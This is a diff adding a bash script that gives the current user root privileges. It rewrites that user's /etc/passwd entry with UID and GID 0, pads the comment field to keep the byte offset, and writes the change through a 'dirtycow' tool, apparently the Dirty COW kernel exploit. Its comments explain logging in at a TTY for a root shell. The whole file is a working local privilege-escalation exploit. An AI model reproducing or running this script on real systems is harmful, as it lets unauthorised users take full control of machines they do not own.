@@ -1,0 +1,46 @@
+#!/bin/bash
+#
+# Edit /etc/passwd to give $USER root privileges.
+#
+# This will likely make the X session unstable. By editing the user's UID in
+# /etc/passwd, many things that check the user's UID (e.g., sudo) will fail.
+#
+# After running this script, switch to a TTY and log in as the current user
+# to gain a root shell.
+
+. "$(dirname "$0")/common.sh"
+
+backup=$HOME/passwd
+cp /etc/passwd "$backup"
+echoerr "Backed up /etc/passwd to $backup"
+
+offset=$(grep -b ^$USER /etc/passwd | cut -d ':' -f 1)
+awk -v FS=':' '
+		BEGIN {
+			// indices of important fields in /etc/passwd
+			i_uid = 3;
+			i_guid = 4;
+			i_comment = 5;
+		}
+
+		/^'$USER'/ {
+			for (i = 1; i <= i_comment; ++i) {
+				if (i < i_uid) {
+					printf $i;
+				} else if (i == i_uid || i == i_guid) {
+					// replace (G)UID with 0 and track length difference
+					padding += length($i) - 1;
+					printf 0;
+				} else if (i == i_comment) {
+					printf $i;
+
+					// pad comment to line up with old end of comment
+					for (n = 0; n < padding; ++n) {
+						printf " ";
+					}
+				}
+
+				printf FS;
+			}
+		}' /etc/passwd \
+	| dirtycow -o $offset /etc/passwd
